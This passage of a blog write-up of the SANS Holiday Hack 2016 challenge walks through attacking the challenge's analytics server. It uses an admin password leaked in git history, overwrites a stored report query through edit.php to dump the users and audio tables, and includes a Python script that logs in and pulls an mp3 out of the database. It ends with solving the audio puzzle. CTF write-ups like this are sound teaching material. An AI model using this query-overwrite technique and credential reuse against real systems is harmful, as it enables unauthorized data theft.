+<p>It reveals that during a few different commits the following line was added and then removed from the list of <code class="highlighter-rouge">sql</code> commands.</p>
+
+<div class="language-sql highlighter-rouge"><pre class="highlight"><code><span class="k">INSERT</span> <span class="k">INTO</span> <span class="nv">`users`</span> <span class="k">VALUES</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">'administrator'</span><span class="p">,</span><span class="s1">'KeepWatchingTheSkies'</span><span class="p">),(</span><span class="mi">1</span><span class="p">,</span><span class="s1">'guest'</span><span class="p">,</span><span class="s1">'busyllama67'</span><span class="p">);</span>
+</code></pre>
+</div>
+
+<p>I am able to confirm that is still the administrator’s password. So now not only can I forge a cookie to be the admin, I can login as the user.</p>
+
+<p>As the admin, you are not presented with the <code class="highlighter-rouge">MP3</code> link in the menu bar at the the top of the site. It is replaced with an <code class="highlighter-rouge">Edit</code> link. This page provides functionality to edit reports that have previously been run on the system. The website provides a capability to query the <code class="highlighter-rouge">launch</code> and <code class="highlighter-rouge">usage</code> statistics of the <em>SantaGram</em> app. Queries can be saved and are given a report number. The guest user can query the usage and launch tables in the database, can save the queries as reports, and then view the reports at a later time. Only the admin can edit the reports.</p>
+
+<p><img src="/assets/images/holidayhack2016/analytics_adminview.png" alt="Analytics Admin View" /></p>
+
+<p>Looking at the code for <code class="highlighter-rouge">query.php</code>, I do not see anyway to inject anything into the database as it uses <code class="highlighter-rouge">mysqli_real_escape_string()</code> on all user provided values to build the query. The same approach is used in <code class="highlighter-rouge">edit.php</code>. I did notice that when a query is saved as a report, its not the results that are saved, but the query itself. Then when a user visits the <code class="highlighter-rouge">view.php</code> page that query is re-executed and the results displayed.</p>
+
+<p>Since the only new addition as admin is the <code class="highlighter-rouge">edit.php</code> file, we will try to exploit it. The page allows a user to enter an existing report id and provide a new name and description. The page then queries the database for that report and build an <code class="highlighter-rouge">UPDATE</code> query to change to the new field that are provided. The code snippet is below:</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="s2">"SELECT * FROM `reports` WHERE `id`='"</span> <span class="o">.</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"' LIMIT 0, 1"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">reply</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="s2">"MySQL Error: "</span> <span class="o">.</span> <span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$db</span><span class="p">));</span>
+      <span class="k">die</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+
+    <span class="c1"># Update the row with the new values
+</span>    <span class="nv">$set</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">print</span> <span class="s2">"Checking for "</span> <span class="o">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"...&lt;br&gt;"</span><span class="p">;</span>
+      <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$name</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">print</span> <span class="s1">'Yup!&lt;br&gt;'</span><span class="p">;</span>
+        <span class="nv">$set</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">"`</span><span class="nv">$name</span><span class="s2">`='"</span> <span class="o">.</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nv">$name</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"'"</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"UPDATE `reports` "</span> <span class="o">.</span>
+      <span class="s2">"SET "</span> <span class="o">.</span> <span class="nb">join</span><span class="p">(</span><span class="nv">$set</span><span class="p">,</span> <span class="s1">', '</span><span class="p">)</span> <span class="o">.</span> <span class="s1">' '</span> <span class="o">.</span>
+      <span class="s2">"WHERE `id`='"</span> <span class="o">.</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"'"</span><span class="p">;</span>
+    <span class="k">print</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre>
+</div>
+
+<p>The vulnerability that you exploit is that for every column in the results of the query if you pass it as a <code class="highlighter-rouge">GET</code> parameter, it will be updated. The page form only provides us with the <code class="highlighter-rouge">name</code> and <code class="highlighter-rouge">detail</code> fields to update, but we know that table has more columns. From <code class="highlighter-rouge">sprusage.sql</code>:</p>
+
+<div class="language-sql highlighter-rouge"><pre class="highlight"><code><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="nv">`reports`</span> <span class="p">(</span>
+  <span class="nv">`id`</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">36</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+  <span class="nv">`name`</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+  <span class="nv">`description`</span> <span class="n">text</span><span class="p">,</span>
+  <span class="nv">`query`</span> <span class="n">text</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+  <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="nv">`id`</span><span class="p">)</span>
+<span class="p">)</span> <span class="n">ENGINE</span><span class="o">=</span><span class="n">InnoDB</span> <span class="k">DEFAULT</span> <span class="n">CHARSET</span><span class="o">=</span><span class="n">latin1</span><span class="p">;</span>
+</code></pre>
+</div>
+
+<p>So if we pass a new query string as the <code class="highlighter-rouge">query</code> parameter to <code class="highlighter-rouge">edit.php</code>, we can overwrite query. So lets dump the <code class="highlighter-rouge">users</code> table with the following URL parameters:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>edit.php?\
+   id=031412db-0f8e-495b-b1b3-e5ede942566b&amp;\
+   name=a&amp;\
+   description=a&amp;\
+   query=SELECT%20*%20from%20users
+</code></pre>
+</div>
+
+<p>Now using that report id in the <code class="highlighter-rouge">view.php</code> page, we see the following</p>
+
+<p><img src="/assets/images/holidayhack2016/analytics_dump_users.png" alt="Analytics User Database" /></p>
+
+<p>So there’s the administrators password again. The goal is to get the audio file and we know there is a table called <code class="highlighter-rouge">audio</code> that has all the metadata about the audio files, so lets query it (I set the name and query parameters the same to be able to know the payload)</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>edit.php?\
+   id=031412db-0f8e-495b-b1b3-e5ede942566b&amp;\
+   name=SELECT%20*%20from%20audio&amp;\
+   query=SELECT%20*%20from%20audio
+</code></pre>
+</div>
+
+<p><img src="/assets/images/holidayhack2016/analytics_audio_dump.png" alt="Analytics Audio Database" /></p>
+
+<p>Now we have the audio file name and id for the seventh and file audio clip. We now must pull it down from the server. A few files in the source related to the audio files must be reviewed, <code class="highlighter-rouge">mp3.php</code> and <code class="highlighter-rouge">getaudio.php</code>.</p>
+
+<p>The file <code class="highlighter-rouge">mp3.php</code> defines a function to build the URL to the <code class="highlighter-rouge">getaudio.php</code> for the current user and its allowed audio files.</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="k">require_once</span><span class="p">(</span><span class="s1">'crypto.php'</span><span class="p">);</span>
+  <span class="k">require_once</span><span class="p">(</span><span class="s1">'db.php'</span><span class="p">);</span>
+
+  <span class="k">function</span> <span class="nf">mp3_web_path</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="s2">"SELECT `id` FROM `audio` WHERE `username` = '"</span> <span class="o">.</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nx">get_username</span><span class="p">())</span> <span class="o">.</span> <span class="s2">"'"</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="s1">'getaudio.php?id='</span> <span class="o">.</span> <span class="nv">$result</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'id'</span><span class="p">];</span>
+  <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre>
+</div>
+
+<p>This is the generatored URL from <code class="highlighter-rouge">index.html</code> when the guest user logs into the website. Now that we know the id for the seventh audio file, we can try to build that URL for ourselves. But we are denied access. Looking at the code for <code class="highlighter-rouge">getaudio.php</code>, we see that only the guest account can download the audio with this page.</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="nv">$username</span> <span class="o">=</span> <span class="nx">get_username</span><span class="p">();</span>
+
+  <span class="c1">// EXPERIMENTAL! Only allow guest to download.
+</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$username</span> <span class="o">===</span> <span class="s1">'guest'</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="s2">"SELECT * FROM `audio` WHERE `id` = '"</span> <span class="o">.</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"' and `username` = '"</span> <span class="o">.</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"'"</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Description: File Transfer'</span><span class="p">);</span>
+      <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/octet-stream'</span><span class="p">);</span>
+      <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Disposition: attachment; filename='</span> <span class="o">.</span> <span class="nv">$result</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'filename'</span><span class="p">]);</span> 
+      <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Transfer-Encoding: binary'</span><span class="p">);</span>
+      <span class="nb">header</span><span class="p">(</span><span class="s1">'Connection: Keep-Alive'</span><span class="p">);</span>
+      <span class="nb">header</span><span class="p">(</span><span class="s1">'Expires: 0'</span><span class="p">);</span>
+      <span class="nb">header</span><span class="p">(</span><span class="s1">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span><span class="p">);</span>
+      <span class="nb">header</span><span class="p">(</span><span class="s1">'Pragma: public'</span><span class="p">);</span>
+      <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Length: '</span> <span class="o">.</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'mp3'</span><span class="p">]));</span>
+
+      <span class="nb">ob_clean</span><span class="p">();</span>
+      <span class="nb">flush</span><span class="p">();</span>
+      <span class="k">print</span> <span class="nv">$result</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'mp3'</span><span class="p">];</span>
+
+      <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+  <span class="p">}</span>
+
+  <span class="k">require_once</span><span class="p">(</span><span class="s1">'header.php'</span><span class="p">);</span>
+
+  <span class="cp">?&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"alert alert-warning"</span><span class="nt">&gt;&lt;strong&gt;</span>Not Accessible!<span class="nt">&lt;/strong&gt;</span> File does not exist or you do not have access to the file.<span class="nt">&lt;/div&gt;</span>
+?&gt; 
+</code></pre>
+</div>
+
+<p>This shows the actual data for the audio file is saved in the database in the <code class="highlighter-rouge">audio</code> table in the <code class="highlighter-rouge">mp3</code> column. So we can return to edit page and get it to dump the <code class="highlighter-rouge">mp3</code> column so that is encoded so we can download it. I scripted up a python program to login into the website, edit a known report, and download the audio file.</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"https://analytics.northpolewonderland.com/"</span>
+
+<span class="n">admindata</span> <span class="o">=</span> <span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="s">"administrator"</span><span class="p">,</span><span class="s">"password"</span><span class="p">:</span><span class="s">"KeepWatchingTheSkies"</span><span class="p">}</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">ra</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">'login.php'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">admindata</span><span class="p">)</span>
+<span class="n">cookies</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">cookies</span>
+
+<span class="n">report</span> <span class="o">=</span> <span class="s">"9b0d08d6-cd77-47ed-8b2d-f81863cc525b"</span>
+
+<span class="n">pwn</span> <span class="o">=</span> <span class="s">"select filename, hex(mp3) from audio where username='administrator'"</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">'edit.php'</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s">'id'</span><span class="p">:</span><span class="n">report</span><span class="p">,</span> <span class="s">'name'</span><span class="p">:</span><span class="n">pwn</span><span class="p">,</span> <span class="s">'query'</span><span class="p">:</span><span class="n">pwn</span><span class="p">})</span>
+<span class="n">view</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">'view.php'</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s">"id"</span><span class="p">:</span><span class="n">report</span><span class="p">})</span>
+
+<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">view</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="n">filename</span><span class="p">,</span> <span class="n">mp3</span> <span class="o">=</span> <span class="p">[</span><span class="n">e</span><span class="o">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">'td'</span><span class="p">)]</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">output</span><span class="p">:</span>
+    <span class="n">output</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">mp3</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">))</span>
+
+<span class="k">print</span> <span class="s">"Audio file saved as {} with size {} kilobytes"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span>
+        <span class="nb">len</span><span class="p">(</span><span class="n">mp3</span><span class="p">)</span><span class="o">/</span><span class="mi">2000</span><span class="p">)</span>
+</code></pre>
+</div>
+
+<p>The output is below:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Audio file saved as discombobulatedaudio7.mp3 with size 220 kilobytes
+</code></pre>
+</div>
+
+<p>So the name of the final audio file is: <code class="highlighter-rouge">discombobulatedaudio7.mp3</code></p>
+
+<h4 id="so-the-answers-to-the-questions-for-part-four">So the answers to the questions for part four…</h4>
+
+<p>The name of the files from each server are shown in the table below</p>
+
+<ul>
+  <li>A7: The names of the files from each server as follows:</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th>Server</th>
+      <th style="text-align: center">File Name</th>
+      <th style="text-align: center">Download</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>APK File</td>
+      <td style="text-align: center">discombobulatedaudio1.mp3</td>
+      <td style="text-align: center"><a href="/assets/mp3/discombobulatedaudio1.mp3">link</a></td>
+    </tr>
+    <tr>
+      <td>Analytics Pre</td>
+      <td style="text-align: center">discombobulatedaudio2.mp3</td>
+      <td style="text-align: center"><a href="/assets/mp3/discombobulatedaudio2.mp3">link</a></td>
+    </tr>
+    <tr>
+      <td>Dungeon</td>
+      <td style="text-align: center">discombobulatedaudio3.mp3</td>
+      <td style="text-align: center"><a href="/assets/mp3/discombobulatedaudio3.mp3">link</a></td>
+    </tr>
+    <tr>
+      <td>Debug</td>
+      <td style="text-align: center">debug-20161224235959-0.mp3</td>
+      <td style="text-align: center"><a href="/assets/mp3/discombobulatedaudio4.mp3">link</a></td>
+    </tr>
+    <tr>
+      <td>Banner</td>
+      <td style="text-align: center">discombobulatedaudio5.mp3</td>
+      <td style="text-align: center"><a href="/assets/mp3/discombobulatedaudio5.mp3">link</a></td>
+    </tr>
+    <tr>
+      <td>Exception</td>
+      <td style="text-align: center">discombobulated-audio-6-XyzE3N9YqKNH.mp3</td>
+      <td style="text-align: center"><a href="/assets/mp3/discombobulatedaudio6.mp3">link</a></td>
+    </tr>
+    <tr>
+      <td>Analytics Post</td>
+      <td style="text-align: center">discombobulatedaudio7.mp3</td>
+      <td style="text-align: center"><a href="/assets/mp3/discombobulatedaudio7.mp3">link</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="part-5-discombobulated-audio">Part 5: Discombobulated Audio</h4>
+
+<p>Before having collected up the last file, I had 6 of the 7 audio files. I decided to try and solve the mystery of who kidnapped Santa. (once I got the 7th file, I had the entire audio clip) Each audio file sounds like a some crazy tunes with a very slow vocal track. I took each audio file and put combined them sequentially in the order of the file name (assuming Debug is #4 since it was listed as the third targeted server). Once I combined them, I opened them in the free audio tool Audacity.  After messing around with various speed settings, I end up changing the <strong>tempo</strong> of the track, which changes the speed but not the pitch. The audio initially to me (without the 7th file) to sounded like</p>
+
+<blockquote>
+  <blockquote>
+    <p>Merry Christmas, Santa Claus or as I have know him….</p>
+  </blockquote>
+</blockquote>
+
+<p><img src="/assets/images/holidayhack2016/audacity.png" alt="Audacity Combine" /></p>
+
+<p><a href="/assets/mp3/cleaned_audio.wav">Download the combined and modified audio file</a></p>
+
+<p>I was pretty sure I heard a British accent and then remembered the miniature British police call box on Santa’s desk. Knowing this is the iconic TARDIS that allows Doctor Who to conduct time travel, I was pretty sure this was a quote from Doctor Who. I also know that Doctor Who always has a Christmas episode, I figured this was a pretty good guess on the culprit. After spending some time Googling my assumed phrase, I went back to the audio file to listen again. Here I realized that it was not <code class="highlighter-rouge">Merry Christmas</code> but <code class="highlighter-rouge">Father Christmas</code>. With this improved quote and Doctor Who, my Google search brought me to the 2005 Christmas episode of <strong>Doctor Who</strong> entitled <em>A Christmas Carol</em> and this quote.</p>
+
+<p><img src="/assets/images/holidayhack2016/imdb_doctor_who.png" alt="IMDB Quote" /></p>
+
+<p>I knew that somehow this information had to be used in the game to figure out the culprit and his motivation. But I had not seen any parts of the game that I could not access. I knew a special area still had to exist. I then recalled that I never used the passphrase from the <em>WarGames</em> terminal in Santa’s office. Also realizing that <a href="http://thesteampunkhome.blogspot.com/2011/02/eds-office-tour.html">Ed Skoudis’s office</a> seems vary similar to Santa’s office, I figure there is a new secret door somewhere. I return to Ed’s errrr Santa’s office and attempt to walk through the walls until I hit the left bookcase. I hit the password panel. I enter <code class="highlighter-rouge">LOOK AT THE PRETTY LIGHTS</code> and I enter a new room called the <code class="highlighter-rouge">Corridor</code>. Lots of players are hanging out here.</p>
+
+<p>Entering the entire quote from Doctor Who, I was able to enter the door at the top of the corridor. This brought me to a staircase to climb the tower. I ascended to the top to find the Doctor standing there.</p>
+
+<p><img src="/assets/images/holidayhack2016/dr_who_combine.png" alt="Coordior Hangout" /></p>
+
+<p>In the conversation with the Doctor he admits to kidnapping Santa Claus. He admits that he wants to take Santa with him (or Jeff) back to November 17, 1978 to stop the <a href="http://www.starwarsholidayspecial.com">Star Wars Holiday Special</a> from ever airing. Unfortunately we foiled the plot so the special will continue to be part of our universe (but I mean, <a href="https://www.youtube.com/watch?v=UC2Q6ANLXQ0">Boba Fett</a> did make his debut in that special, so it cannot be that bad.)</p>
+
+<h4 id="the-answers-to-the-question-for-part-five-are">The answers to the question for part five are…</h4>
+
+<ul>
+  <li>A9: The villain behind the nefarious plot is Dr. Who</li>
+  <li>A10: Dr. Who kidnapped Santa to take him back to 1978 so to make it so that the Star Wars Holiday Special never existed.
+That was so much fun and a great challenge. Thanks to Ed and the team and looking forward to 2017!</li>
+</ul>
+
+<h4 id="constant-vigilance">Constant Vigilance!</h4>
